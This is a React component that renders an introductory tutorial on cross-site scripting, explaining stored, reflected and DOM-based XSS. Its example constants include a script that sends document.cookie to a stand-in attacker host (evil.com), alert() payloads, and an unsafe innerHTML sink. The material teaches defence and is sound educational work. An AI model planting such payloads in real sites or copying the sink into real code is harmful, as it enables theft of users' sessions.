import React from "react";
import { Card, Highlight } from "e-ui-react";

const STORED_EXAMPLE_XSS = `<!-- Attacker posts this in a comment -->
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>`;

const REFLECTED_EXAMPLE_XSS = `https://victim.com/search?q=<script>alert('Hacked')</script>`;

const DOM_EXAMPLE_XSS = `// URL: https://victim.com/#<script>alert('Hacked')</script>
document.body.innerHTML = location.hash.substring(1);`;

const Introduction = () =>{
 return (<div className="mtop15p lh28p fs16p">
   <div className="mtop15p">
      <Card padding={15} backgroundColor="#eee">
         <div><h4 className="blog-head"><b>The Problem Before Addressing XSS</b></h4></div>
         <div className="mtop15p">Before modern web security measures were introduced, websites trusted almost all 
         user inputs without proper filtering. This trust created a huge security hole:</div>
         <div>
            <ul>
               <li className="mtop5p"><b>User-supplied data</b> was directly displayed on pages without cleaning or 
               escaping special characters.</li>
               <li className="mtop5p">If someone typed <b>HTML or JavaScript code</b> into a form or comment box, the 
               browser would simply run it.</li>
               <li className="mtop5p">Hackers realized they could <b>inject scripts</b> into legitimate sites to: 
               Steal <b>cookies</b> and <b>session tokens</b>, Redirect users to malicious websites, Deface websites 
               or spread <b>malware</b></li>
               <li className="mtop5p">These attacks could be carried out <b>without needing access to the server</b> — only 
               by exploiting <b>how browsers interpret code.</b></li>
            </ul>
         </div>
         <div className="mtop5p"><b>The result:</b> A single malicious message in a forum, comment section, or URL parameter 
         could compromise thousands of users.</div>
         <div className="mtop5p">To tackle this, browsers and developers introduced <b>input validation, output encoding, and 
            security headers</b> like <b>Content-Security Policy (CSP)</b> to defend against <b>XSS attacks.</b></div>
      </Card>
   </div>
   <div className="mtop15p"><h2 className="blog-head"><b>Introduction  – What is XSS?</b></h2></div>
   <div className="mtop15p"><b>Cross-Site Scripting (XSS)</b> is a <b>security vulnerability</b> that allows attackers to 
   inject <b>malicious JavaScript</b> into web pages viewed by other users.</div>
   <div className="mtop5p"><b>Key points:</b></div>
   <div>
      <ul>
         <li className="mtop5p">XSS attacks run <b>inside the victim’s browser,</b> not on the attacker’s machine.</li>
         <li className="mtop5p">It exploits the <b>trust a user has</b> in a website.</li>
         <li className="mtop5p">Once injected, malicious scripts can <b>access cookies, localStorage, and DOM</b> — often 
         leading to account hijacking or sensitive data theft.</li>
      </ul>
   </div>
   <div className="mtop15p"><h4 className="blog-head"><b>Types of XSS Attacks</b></h4></div>
   <div>
      <ol>
         <li className="mtop5p">
            <div><h5 className="blog-head"><b>Stored XSS (Persistent)</b></h5></div>
            <div>
               <ul>
                  <li className="mtop5p">Malicious script is <b>saved</b> on the server (e.g., in a database, comment section).</li>
                  <li className="mtop5p">When another user visits the page, the script runs automatically.</li>
               </ul>
            </div>
            <div className="mtop5p"><b>Example:</b></div>
            <div className="mtop5p">
               <Highlight content={STORED_EXAMPLE_XSS} lang="javascript" />
            </div>
            <div className="mtop5p">If the site doesn’t sanitize inputs, every visitor to that page sends their 
            cookies to the attacker.</div>
         </li>
         <li className="mtop5p">
            <div><h5 className="blog-head"><b>Reflected XSS (Non-Persistent)</b></h5></div>
            <div>
               <ul>
                  <li className="mtop5p">Malicious code is sent as part of the <b>URL or form submission.</b></li>
                  <li className="mtop5p">The server <b>reflects</b> it back in the response without sanitizing it.</li>
               </ul>
            </div>
            <div className="mtop5p"><b>Example:</b></div>
            <div className="mtop5p">
               <Highlight content={REFLECTED_EXAMPLE_XSS} lang="javascript" />
            </div>
            <div className="mtop5p">If the search results page directly displays <code><b>q</b></code> without escaping 
            HTML, the script runs.</div>
         </li>
         <li className="mtop5p">
            <div><h5 className="blog-head"><b>DOM-based XSS</b></h5></div>
            <div>
               <ul>
                  <li className="mtop5p">Occurs entirely in the browser — <b>JavaScript on the client side</b> dynamically 
                  writes unsafe data to the page.</li>
                  <li className="mtop5p">No server involvement is needed.</li>
               </ul>
            </div>
            <div className="mtop5p"><b>Example:</b></div>
            <div className="mtop5p">
               <Highlight content={DOM_EXAMPLE_XSS} lang="javascript" />
            </div>
            <div className="mtop5p">Here, the browser executes whatever is in the URL fragment.</div>
         </li>
      </ol>
   </div>
 </div>);
};

export default Introduction;